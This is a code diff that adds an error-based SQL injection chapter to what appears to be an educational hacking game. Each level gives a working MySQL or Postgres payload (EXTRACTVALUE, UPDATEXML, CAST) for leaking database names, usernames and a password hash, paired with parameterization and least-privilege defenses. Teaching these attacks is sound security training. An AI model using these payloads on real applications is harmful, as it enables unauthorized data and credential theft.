@@ -805,7 +805,209 @@ session.userId = user.id;`,
       };
     },
   },
-  // Chapters 2 – 8 + NoSQL bonus land in Task #5.
+  2: {
+    id: 2, name: 'Error-Based', class: 'error-based',
+    intro: 'The DB still speaks when it errors. Make it shout what it knows.',
+    levels: {
+      1: {
+        id: '2.1', name: 'Loose Tongue',
+        endpoint: 'GET /search?q={u}',
+        query: "SELECT title FROM posts WHERE title LIKE '%{u}%'",
+        field: 'q',
+        goal: 'Force a visible SQL error so the server leaks the bad query fragment.',
+        reconNotes: [
+          'Error responses are verbose — stack traces and SQL fragments are echoed.',
+          'An unbalanced quote should produce a "syntax near ..." error.',
+        ],
+        hints: [
+          "Break the string with a bare ' and see what the error leaks.",
+          'A dangling quote in a LIKE clause errors reliably.',
+          "Payload:  '",
+        ],
+        check(p) {
+          const bareQuote = /^[^']*'[^']*$/.test(p) && !/--|\/\*|#/.test(p);
+          return bareQuote
+            ? { ok: true, narrate: 'The server coughs up: "near \\\'%\\\': syntax error in posts.title". Column leaked.' }
+            : { ok: false, narrate: 'No error. The server is silent.' };
+        },
+        unlockTokens: ["'"],
+        defense: {
+          title: 'Suppress Verbose Errors in Production',
+          body: 'Error-based SQLi depends on leakage. Generic 500 pages + parameterized queries kill this whole class.',
+          code:
+`// Express / Node example:
+app.use((err, req, res, next) => {
+  logger.error(err);
+  res.status(500).json({ error: 'internal' });  // no stack, no SQL fragment
+});`,
+          tip: 'Log the error; return a generic message. Attackers cannot exploit what they cannot see.',
+        },
+      },
+      2: {
+        id: '2.2', name: 'The Extracted Truth',
+        endpoint: 'GET /item?id={n}',
+        query: 'SELECT name FROM items WHERE id={u}',
+        field: 'id',
+        goal: 'Use EXTRACTVALUE to leak the current database name through the error channel.',
+        reconNotes: [
+          'Numeric context. MySQL behind the scenes.',
+          'EXTRACTVALUE throws an error that embeds its second argument.',
+          'Typical payload: AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database())))',
+        ],
+        hints: [
+          'Think: use an error function that echoes its malformed XPath argument.',
+          'EXTRACTVALUE(1, CONCAT(0x7e, <subquery>)) is the classic.',
+          'Payload:  1 AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database())))',
+        ],
+        check(p) {
+          const ok = /extractvalue\s*\(.+concat\s*\(.*(0x7e|'~').*select/i.test(p);
+          return ok
+            ? { ok: true, narrate: 'Error: "XPATH syntax error: \\\'~dungeon_db\\\'". The database name is yours.' }
+            : { ok: false, narrate: 'No leak. The query returns a name normally.' };
+        },
+        unlockTokens: ['EXTRACTVALUE(', 'CONCAT(', '0x7e', 'SELECT database()'],
+        defense: {
+          title: 'Parameterize + Strip Error Internals',
+          body: 'EXTRACTVALUE only fires because input reaches the query. Parameters neutralize it.',
+          code:
+`// Vulnerable:
+db.query("SELECT name FROM items WHERE id=" + req.query.id);
+
+// Fixed:
+db.query("SELECT name FROM items WHERE id = ?", [Number(req.query.id)]);`,
+          tip: 'There is no safe way to interpolate input into SQL. Always bind.',
+        },
+      },
+      3: {
+        id: '2.3', name: 'The XML Trick',
+        endpoint: 'GET /item?id={n}',
+        query: 'SELECT name FROM items WHERE id={u}',
+        field: 'id',
+        goal: 'Same leak, different function: use UPDATEXML to exfiltrate the first user name.',
+        reconNotes: [
+          'EXTRACTVALUE has been filtered by name. UPDATEXML is similar and not filtered.',
+          'UPDATEXML(1, CONCAT(0x7e,(SELECT ...)),1) throws the same style of error.',
+        ],
+        hints: [
+          'Try UPDATEXML with the same CONCAT shape.',
+          'Payload skeleton: 1 AND UPDATEXML(1, CONCAT(0x7e,(SELECT username FROM users LIMIT 1)),1)',
+        ],
+        check(p) {
+          const ok = /updatexml\s*\(.+concat\s*\(.*(0x7e|'~').*select.+from\s+users/i.test(p);
+          return ok
+            ? { ok: true, narrate: 'Error: "XPATH: \\\'~alice\\\'". First user: alice.' }
+            : { ok: false, narrate: 'No leak.' };
+        },
+        unlockTokens: ['UPDATEXML(', 'LIMIT 1'],
+        defense: {
+          title: 'Denylists Die; Parameters Live',
+          body: 'Filtering by function name (EXTRACTVALUE) is whack-a-mole. Fix the root cause: do not interpolate.',
+          code:
+`// Bad — denylist:
+if (/extractvalue/i.test(input)) reject();  // UPDATEXML, XMLTYPE, etc. still work
+
+// Good — parameters:
+db.query("SELECT name FROM items WHERE id = ?", [id]);`,
+          tip: 'Every filter has a bypass. Parameters don\'t.',
+        },
+      },
+      4: {
+        id: '2.4', name: 'The Cast of Lies',
+        endpoint: 'GET /item?id={n}',
+        query: 'SELECT name FROM items WHERE id={u}',
+        field: 'id',
+        goal: 'Use a CAST type-conversion error to leak a string value.',
+        reconNotes: [
+          'Postgres backend this time — CAST((SELECT ...) AS INT) errors with the offending text.',
+          '"invalid input syntax for type integer: \\"admin\\"" — the value is in the error.',
+        ],
+        hints: [
+          'Force a string-to-int cast: CAST((SELECT username FROM users LIMIT 1) AS INT)',
+          'Payload: 1 AND 1=CAST((SELECT username FROM users LIMIT 1) AS INT)',
+        ],
+        check(p) {
+          const ok = /cast\s*\(\s*\(\s*select/i.test(p) && /as\s+(int|signed|integer)/i.test(p);
+          return ok
+            ? { ok: true, narrate: 'invalid input syntax for type integer: "captain". You know who runs this place.' }
+            : { ok: false, narrate: 'No cast, no leak.' };
+        },
+        unlockTokens: ['CAST(', 'AS INT'],
+        defense: {
+          title: 'Error Messages Are an Exfil Channel',
+          body: 'Any error that echoes a value can exfil that value. Generic 500s + parameters shut both sides down.',
+          code:
+`// Return generic errors in prod; log details server-side only.
+// Parameterize everything.`,
+          tip: 'Treat error output like response body — attacker-readable by default.',
+        },
+      },
+      5: {
+        id: '2.5', name: 'The Hash Exposed',
+        endpoint: 'GET /item?id={n}',
+        query: 'SELECT name FROM items WHERE id={u}',
+        field: 'id',
+        goal: 'Exfiltrate the captain\'s password hash via an error channel.',
+        reconNotes: [
+          'users table has columns: id, username, pw_hash.',
+          'You have EXTRACTVALUE, UPDATEXML, and CAST available.',
+          'Select pw_hash WHERE username=\'captain\' — embed in an error-throwing expression.',
+        ],
+        hints: [
+          'Pin the subquery to captain: SELECT pw_hash FROM users WHERE username=\'captain\'',
+          'Wrap in EXTRACTVALUE or UPDATEXML with CONCAT/0x7e.',
+          "Payload: 1 AND UPDATEXML(1,CONCAT(0x7e,(SELECT pw_hash FROM users WHERE username='captain')),1)",
+        ],
+        check(p) {
+          const subselect = /select\s+pw_hash\s+from\s+users\s+where\s+username\s*=\s*['"]captain['"]/i.test(p);
+          const leakFn   = /(extractvalue|updatexml|cast)\s*\(/i.test(p);
+          return (subselect && leakFn)
+            ? { ok: true, narrate: 'XPATH error spills: ~$argon2id$v=19$…  — captain\'s hash, yours to crack offline.' }
+            : { ok: false, narrate: 'Subquery or error function missing. Nothing leaks.' };
+        },
+        unlockTokens: ['WHERE username=\'captain\''],
+        defense: {
+          title: 'Defense in Depth for Error Channels',
+          body: 'Multiple layers: parameterize, suppress verbose errors, use least-privilege DB users so SELECT pw_hash fails at the DB layer.',
+          code:
+`-- Principle of least privilege:
+CREATE ROLE app_reader;
+GRANT SELECT (id, username) ON users TO app_reader;  -- no pw_hash
+-- App connects as app_reader. Even a perfect SQLi cannot read the hash.`,
+          tip: 'Application should never have SELECT on password columns. Hashes belong behind a login service.',
+        },
+      },
+    },
+    sandbox(seed) {
+      const rand = mulberry32(seed);
+      const backends = ['MySQL', 'Postgres'];
+      const be = backends[Math.floor(rand() * backends.length)];
+      const leakFn = be === 'MySQL' ? 'EXTRACTVALUE or UPDATEXML' : 'CAST(... AS INT)';
+      return {
+        id: `2.S-${seed}`, name: `Sandbox: ${be} errors`,
+        endpoint: 'GET /item?id={n}',
+        query: 'SELECT name FROM items WHERE id={u}',
+        field: 'id',
+        goal: `Leak the current ${be === 'MySQL' ? 'database name' : 'first username'} via an error channel.`,
+        reconNotes: [
+          `Backend: ${be}.`,
+          `Available error leak: ${leakFn}.`,
+          'Sandbox: cheatsheet definitions are visible.',
+        ],
+        hints: [],
+        check(p) {
+          const mysqlOk   = /(extractvalue|updatexml)\s*\(.+concat\s*\(.*(0x7e|'~').*select/i.test(p);
+          const pgOk      = /cast\s*\(\s*\(\s*select/i.test(p) && /as\s+(int|integer)/i.test(p);
+          return ((be === 'MySQL' && mysqlOk) || (be === 'Postgres' && pgOk))
+            ? { ok: true, narrate: 'Error channel spills the target.' }
+            : { ok: false, narrate: 'No leak.' };
+        },
+        unlockTokens: [],
+        defense: { title: 'Sandbox Cleared', body: 'Same defenses.', code: '// See earlier cards.', tip: 'Re-roll for another seed.' },
+        sandbox: true,
+      };
+    },
+  },
+  // Chapters 3 – 8 + NoSQL bonus still to author — see DESIGN.md §11.
 };
 
 const KNOWN_TOKENS = [
@@ -1337,10 +1539,21 @@ function advance() {
         log('Re-rolling the sandbox…', 'lore');
         rerollSandbox();
       } else {
-        log(`Chapter ${state.chapter} authored content cleared. Click the sandbox on the map, or wait for next chapters.`, 'crit');
-        state.phase = 'recon';
-        renderPhase(); saveState();
-        drawMap();
+        // Try auto-advance to next chapter
+        const nextChapterId = state.chapter + 1;
+        if (CHAPTERS[nextChapterId]) {
+          if (!state.unlockedChapters.includes(nextChapterId)) state.unlockedChapters.push(nextChapterId);
+          log(`Chapter ${state.chapter} cleared. Unlocking Chapter ${nextChapterId} — ${CHAPTERS[nextChapterId].name}.`, 'crit');
+          state.hp = state.hpMax;  // full heal between chapters
+          state.hpMax += 2;        // +2 max HP per chapter cleared
+          renderStats();
+          startLevel(nextChapterId, 1);
+        } else {
+          log(`All authored chapters cleared. More content pending — see DESIGN.md.`, 'crit');
+          state.phase = 'recon';
+          renderPhase(); saveState();
+          drawMap();
+        }
       }
       break;
     }
